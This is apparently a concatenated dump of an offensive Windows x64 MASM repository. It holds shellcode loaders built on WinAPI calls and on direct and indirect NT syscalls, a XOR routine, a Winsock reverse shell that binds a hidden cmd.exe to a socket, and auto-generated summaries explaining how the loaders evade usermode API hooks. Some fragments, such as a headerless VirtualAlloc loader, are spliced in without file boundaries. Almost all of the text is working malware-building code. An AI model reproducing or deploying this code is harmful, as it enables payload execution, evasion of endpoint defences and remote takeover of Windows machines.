title: indirect.asm
content:
extern g_NtAllocateVirtualMemorySSN:DWORD
extern g_NtAllocateVirtualMemorySyscall:QWORD
extern g_NtWriteVirtualMemorySSN:DWORD
extern g_NtWriteVirtualMemorySyscall:QWORD
extern g_NtProtectVirtualMemorySSN:DWORD
extern g_NtProtectVirtualMemorySyscall:QWORD

.data
myMemory dq ?
oldProtect dq 0
dwSize dq 1024
BytesWritten dq ?

.code

NtAllocateVirtualMemory proc
 mov r10, rcx
 mov eax, g_NtAllocateVirtualMemorySSN
 jmp qword ptr g_NtAllocateVirtualMemorySyscall 
 ret 
NtAllocateVirtualMemory endp

NtWriteVirtualMemory proc
 mov r10, rcx
 mov eax, g_NtWriteVirtualMemorySSN 
 jmp qword ptr g_NtWriteVirtualMemorySyscall 
 ret 
NtWriteVirtualMemory endp

NtProtectVirtualMemory proc
 mov r10, rcx
 mov eax, g_NtProtectVirtualMemorySSN 
 jmp qword ptr g_NtProtectVirtualMemorySyscall 
 ret 
NtProtectVirtualMemory endp



NtIndirectSyscalls proc
; 1. Save non-volatile registers used in this function (Windows x64 requirement)
 push rbx
 push r12
 push rsi; keeping 16-byte alignment (3 pushes = 24 bytes, plus 8 for return address = 32 bytes)

; Setup standard 32-byte shadow space for our calls
 sub rsp, 20h 

 mov rbx, rdx
 mov r12, rcx 

 mov rcx, r12
 lea rdx, [myMemory]
 xor r8, r8
 lea r9, [dwSize] 
 mov qword ptr [rsp + 20h], 3000h 
 mov qword ptr [rsp + 28h], 04h 
 call NtAllocateVirtualMemory
 
 
 mov rcx, r12
 mov rdx, myMemory 
 mov r8, rbx 
 mov r9, dwSize
 lea r11, [BytesWritten]
 mov qword ptr [rsp + 20h], r11 
 call NtWriteVirtualMemory
 
 mov rcx, r12
 lea rdx, [myMemory]
 lea r8, [dwSize] 
 mov r9, 20h 
 lea r11, [oldProtect] 
 mov qword ptr [rsp + 20h], r11 
 call NtProtectVirtualMemory

; Clean up shadow space stack allocation
 add rsp, 20h

; Restore non-volatile registers
 pop rsi
 pop r12
 pop rbx

; Ensure 16-byte alignment before jumping to shellcode payload
 and rsp, -16 
 
; Execute the allocated & unlocked Memory Block
 call qword ptr [myMemory] 

 ret
NtIndirectSyscalls endp

end

enrichment.summary: x64 assembly implementation of indirect syscalls for shellcode execution, allocating memory, writing payload, changing protections, and transferring control.
enrichment.abstract: The source is an x64 assembly file implementing indirect NT syscalls. It resolves SSNs and syscall instruction addresses externally, allocates RW memory, writes shellcode, reprotects to RX, aligns the stack, and jumps to the payload.

card.title: x64 Indirect Syscall Shellcode Execution Assembly
card.purpose: Execute shellcode in newly allocated memory using indirect NT syscalls to bypass usermode API hooks.
card.technical_context: Windows x64 assembly (MASM). Relies on externally resolved SSNs (DWORD) and syscall instruction addresses (QWORD). Adheres to Windows x64 calling convention (shadow space, register volatility, 16-byte stack alignment).
card.mechanism: The file defines assembly procedures for NtAllocateVirtualMemory, NtWriteVirtualMemory, and NtProtectVirtualMemory. Each procedure loads an externally-provided SSN into eax and jumps to an externally-provided syscall instruction address. A main procedure (NtIndirectSyscalls) uses these to allocate RW memory, write a provided buffer, reprotect the memory to RX (0x20), align the stack to 16 bytes, and call the written memory directly.
key_points: Syscalls are executed indirectly by jumping to a syscall instruction address stored in a global variable.
SSNs and syscall addresses are resolved externally and imported as global symbols.
Memory is allocated with PAGE_READWRITE (0x04) and allocation type 0x3000 (COMMIT | RESERVE).
Memory protection is changed to PAGE_EXECUTE_READ (0x20) before execution.
Stack is explicitly 16-byte aligned before executing the shellcode payload.
tradecraft_context: Indirect syscalls are used to bypass usermode API hooks by executing the syscall instruction from within ntdll rather than from the invoking module.
caveats: The source does not contain the logic for resolving SSNs or syscall addresses; it assumes they are pre-populated.

title: ntapi.asm
content:
extern NtAllocateVirtualMemory: proc
extern NtWriteVirtualMemory: proc
extern NtProtectVirtualMemory: proc

.data
myMemory dq ?
oldProtect dq 0
dwSize dq 1024
BytesWritten dq ?
.code
NtApi proc
; Setup Stack (Shadow space 32 bytes + 16 bytes padding = 48/30h)
 sub rsp, 30h 
 mov rbx, rdx

;__kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(
; [in] HANDLE ProcessHandle,
; [in, out] PVOID *BaseAddress,
; [in] ULONG_PTR ZeroBits,
; [in, out] PSIZE_T RegionSize,
; [in] ULONG AllocationType,
; [in] ULONG Protect)
 mov r12, rcx
 lea rdx, [myMemory]
 xor r8, r8
 lea r9, [dwSize] 
 mov qword ptr [rsp+20h], 3000h 
 mov qword ptr [rsp+28h], 4h 
 call NtAllocateVirtualMemory
 
;NtWriteVirtualMemory(
;IN HANDLE ProcessHandle,
;IN PVOID BaseAddress,
;IN PVOID Buffer,
;IN SIZE_T NumberOfBytesToWrite,
;OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

 sub rsp, 30h
 mov rcx, r12
 mov rdx, myMemory 
 mov r8, rbx 
 mov r9, dwSize
 lea r11, [BytesWritten]
 mov qword ptr [rsp-20], r11
 call NtWriteVirtualMemory
 
 add rsp, 30h

; NtProtectVirtualMemory(
; IN HANDLE ProcessHandle,
; IN OUT PVOID* BaseAddress,
; IN OUT PSIZE_T RegionSize,
; IN ULONG NewProtect,
; OUT PULONG OldProtect);

 mov rcx, r12
 lea rdx, [myMemory]
 lea r8, [dwSize] 
 mov r9, 20h 
 lea r11, [oldProtect] 
 mov qword ptr [rsp+20h], r11
 call NtProtectVirtualMemory

; We ensure RSP is 16-byte aligned before jumping to the payload
 and rsp, -16 
 
; Execute the Memory Block
 call myMemory 

 add rsp, 30h
 ret
NtApi endp
end

title: rev.asm
content:
EXTERN WSAStartup:PROC
EXTERN WSACleanup:PROC
EXTERN WSASocketA:PROC
EXTERN connect:PROC
EXTERN closesocket:PROC
EXTERN htons:PROC
EXTERN inet_addr:PROC
EXTERN CreateProcessA:PROC
EXTERN SetHandleInformation:PROC

AF_INET EQU 2
SOCK_STREAM EQU 1
IPPROTO_TCP EQU 6

INVALID_SOCKET EQU -1
SOCKET_ERROR EQU -1

STARTF_USESTDHANDLES EQU 00000100h
CREATE_NO_WINDOW EQU 08000000h
HANDLE_FLAG_INHERIT EQU 00000001h
INFINITE EQU 0FFFFFFFFh

WSADATA64 STRUCT
 wVersion WORD ?
 wHighVersion WORD ?
 szDescription BYTE 257 DUP(?)
 szSystemStatus BYTE 129 DUP(?)
 iMaxSockets WORD ?
 iMaxUdpDg WORD ?
 lpVendorInfo QWORD ?
WSADATA64 ENDS

SOCKADDR_IN STRUCT
 sin_family WORD ?
 sin_port WORD ?
 sin_addr DWORD ?
 sin_zero BYTE 8 DUP(?)
SOCKADDR_IN ENDS

STARTUPINFOA STRUCT
 cb DWORD ?
 _pad0 DWORD ?
 lpReserved QWORD ?
 lpDesktop QWORD ?
 lpTitle QWORD ?

 dwX DWORD ?
 dwY DWORD ?
 dwXSize DWORD ?
 dwYSize DWORD ?
 dwXCountChars DWORD ?
 dwYCountChars DWORD ?
 dwFillAttribute DWORD ?
 dwFlags DWORD ?

 wShowWindow WORD ?
 cbReserved2 WORD ?
 _pad1 DWORD ?

 lpReserved2 QWORD ?
 hStdInput QWORD ?
 hStdOutput QWORD ?
 hStdError QWORD ?
STARTUPINFOA ENDS

PROCESS_INFORMATION64 STRUCT
 hProcess QWORD ?
 hThread QWORD ?
 dwProcessId DWORD ?
 dwThreadId DWORD ?
 dwPadding_ DWORD ?
PROCESS_INFORMATION64 ENDS

.data?
wsaData WSADATA64 <>
sockaddr_buf SOCKADDR_IN <>
sinfo STARTUPINFOA <>
pinfo PROCESS_INFORMATION64 <>
appPath db 16 DUP(?)

.code

RevConnect PROC

 push rdi
 push rsi
 push rbx
 sub rsp, 0A0h; Allocate a secure stack frame (16-byte aligned)

 mov rdi, rcx 
 mov ebx, edx 

; WSAStartup(0x0202, &wsaData)
 lea rdx, wsaData
 mov ecx, 0202h
 call WSAStartup
 test eax, eax
 jnz fail

; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)
 mov ecx, AF_INET
 mov edx, SOCK_STREAM
 mov r8d, IPPROTO_TCP
 xor r9, r9; lpProtocolInfo = NULL
 mov qword ptr [rsp + 20h], 0; g = 0 (5th arg)
 mov qword ptr [rsp + 28h], 0; dwFlags = 0 (6th arg)
 call WSASocketA
 cmp rax, INVALID_SOCKET
 je fail_cleanup

 mov rsi, rax; rsi = socket handle

; Explicitly mark socket handle as inheritable
 mov rcx, rsi 
 mov edx, HANDLE_FLAG_INHERIT 
 mov r8d, HANDLE_FLAG_INHERIT 
 call SetHandleInformation

; sockaddr_in setup
 mov word ptr [sockaddr_buf.sin_family], AF_INET
 mov ecx, ebx
 call htons
 mov word ptr [sockaddr_buf.sin_port], ax

 mov rcx, rdi
 call inet_addr
 mov dword ptr [sockaddr_buf.sin_addr], eax

; connect(socket, &sa, sizeof(sa))
 mov rcx, rsi
 lea rdx, sockaddr_buf
 mov r8d, SIZEOF SOCKADDR_IN
 call connect
 
 cmp eax, SOCKET_ERROR
 je fail_socket

 mov dword ptr [sinfo.cb], SIZEOF STARTUPINFOA
 mov dword ptr [sinfo.dwFlags], STARTF_USESTDHANDLES
 
; Map the socket handle cleanly to all standard handles
 mov qword ptr [sinfo.hStdInput], rsi
 mov qword ptr [sinfo.hStdOutput], rsi
 mov qword ptr [sinfo.hStdError], rsi

 lea rax, appPath
 mov byte ptr [rax+0], 'c'
 mov byte ptr [rax+1], 'm'
 mov byte ptr [rax+2], 'd'
 mov byte ptr [rax+3], 0

;CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)
 xor r12, r12
 mov qword ptr [rsp + 20h], 1; bInheritHandles = TRUE (5th param)
 mov qword ptr [rsp + 28h], CREATE_NO_WINDOW; dwCreationFlags (6th param)
 mov qword ptr [rsp + 30h], r12; lpEnvironment (7th param)
 mov qword ptr [rsp + 38h], r12; lpCurrentDirectory (8th param)
 
 lea r12, sinfo
 mov qword ptr [rsp + 40h], r12; lpStartupInfo (9th param)
 
 lea r12, pinfo
 mov qword ptr [rsp + 48h], r12; lpProcessInformation (10th param)

 xor rcx, rcx; lpApplicationName = NULL
 lea rdx, appPath; lpCommandLine = "cmd"
 xor r8, r8; lpProcessAttributes = NULL
 xor r9, r9; lpThreadAttributes = NULL

 call CreateProcessA
 
fail_socket:
 mov rcx, rsi
 call closesocket

fail_cleanup:
 call WSACleanup

fail:
 xor rax, rax

exit_func:
 add rsp, 0A0h
 pop rbx
 pop rsi
 pop rdi
 ret

RevConnect ENDP

END

enrichment.abstract: The source code defines a 64-bit assembly procedure, RevConnect, that initializes Winsock, creates a TCP socket, marks it inheritable, connects to a remote address, and spawns cmd.exe. card.title: Assembly Reverse Shell via Socket Handle Inheritance
card.purpose: Establish a TCP connection to a remote host and bind the socket to a spawned cmd.exe process to provide interactive command execution.

CreateProcessA is called with bInheritHandles set to TRUE and the CREATE_NO_WINDOW flag, launching cmd.exe with its standard streams redirected over the network socket.

; Setup Stack (Shadow space 32 bytes + 16 bytes padding = 48/30h)

; VirtualAlloc(0, 1024, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 xor rcx, rcx 
 mov rdx, 1024 
 mov r8, 3000h 
 mov r9, 4h 
 call VirtualAlloc
 
 test rax, rax 
 jz exit_proc
 mov myMemory, rax 

;RtlMoveMemory(myMemory, payload_ptr, 205)

 mov rdx, rbx 
 mov r8, 205 
 call RtlMoveMemory

;VirtualProtect(myMemory, 205, PAGE_EXECUTE_READ, &oldProtect)
 mov rcx, myMemory 
 mov rdx, 205 
 mov r8, 20h 
 lea r9, [oldProtect] 
 call VirtualProtect

 test rax, rax 
 jz exit_proc
; We ensure RSP is 16-byte aligned before jumping to the payload
 and rsp, -16 
 
; Execute the Memory Block
 call myMemory 

exit_proc:
 add rsp, 30h
 ret
Allocate endp
end

title: syscalls.asm
content:
EXTRN g_NtAllocateVirtualMemorySSN:DWORD
EXTRN g_NtWriteVirtualMemorySSN:DWORD
EXTRN g_NtProtectVirtualMemorySSN:DWORD

.data
myMemory dq ?
oldProtect dq 0
dwSize dq 1024
BytesWritten dq ?

.code

NtAllocateVirtualMemory proc 
 mov r10, rcx
 mov eax, g_NtAllocateVirtualMemorySSN 
 syscall 
 ret 
NtAllocateVirtualMemory endp

NtWriteVirtualMemory proc 
 mov r10, rcx
 mov eax, g_NtWriteVirtualMemorySSN 
 syscall 
 ret 
NtWriteVirtualMemory endp 

NtProtectVirtualMemory proc
 mov r10, rcx
 mov eax, g_NtProtectVirtualMemorySSN 
 syscall
 ret 
NtProtectVirtualMemory endp


NtSyscalls proc
; 1. Save non-volatile registers used in this function (Windows x64 requirement)
 push rbx
 push r12
 push rsi; keeping 16-byte alignment (3 pushes = 24 bytes, plus 8 for return address = 32 bytes)

; Setup standard 32-byte shadow space for our calls
 sub rsp, 20h 

 mov rbx, rdx 
 mov r12, rcx 

 mov rcx, r12
 lea rdx, [myMemory]
 xor r8, r8
 lea r9, [dwSize] 
 mov qword ptr [rsp + 20h], 3000h 
 mov qword ptr [rsp + 28h], 04h 
 call NtAllocateVirtualMemory
 
 
 mov rcx, r12
 mov rdx, myMemory 
 mov r8, rbx 
 mov r9, dwSize
 lea r11, [BytesWritten]
 mov qword ptr [rsp + 20h], r11 
 call NtWriteVirtualMemory
 
 mov rcx, r12
 lea rdx, [myMemory]
 lea r8, [dwSize] 
 mov r9, 20h 
 lea r11, [oldProtect] 
 mov qword ptr [rsp + 20h], r11 
 call NtProtectVirtualMemory

; Clean up shadow space stack allocation
 add rsp, 20h

; Restore non-volatile registers
 pop rsi
 pop r12
 pop rbx

; Ensure 16-byte alignment before jumping to shellcode payload
 and rsp, -16 
 
; Execute the allocated & unlocked Memory Block
 call qword ptr [myMemory] 

 ret
NtSyscalls endp

end

.code

XorIt proc
	mov r10, rcx
	mov r11, rdx
	push r12
	lea r12, [rdx+r9]
	
loopxor:
 cmp r8, 0
 je done
 
 mov al, [r10]
 xor al, [r11]
 mov [r10], al
 
 inc r10
 inc r11
 dec r8
 
 cmp r11, r12
 jne loopxor
 
 mov r11, rdx
 
 jmp loopxor
done:
 pop r12
	ret
XorIt endp
end

title: README.md
content:
# Offensive Windows x64 Assembly

Collection of programs I made while learning assembly. They are Visual studio projects that use masm as build dependency and the assembly functions are called in C and then are given the necessary arguments.

* Win API shellcode loader
* NtApi Shellcode loader
* Syscalls Shellcode loader (with some code in C to resolve functions)
* Indirect Syscalls Shellcode loader
* Basic Xor encryption program
* Reverse Shell using WinSock and CreateProcessA

# Credits
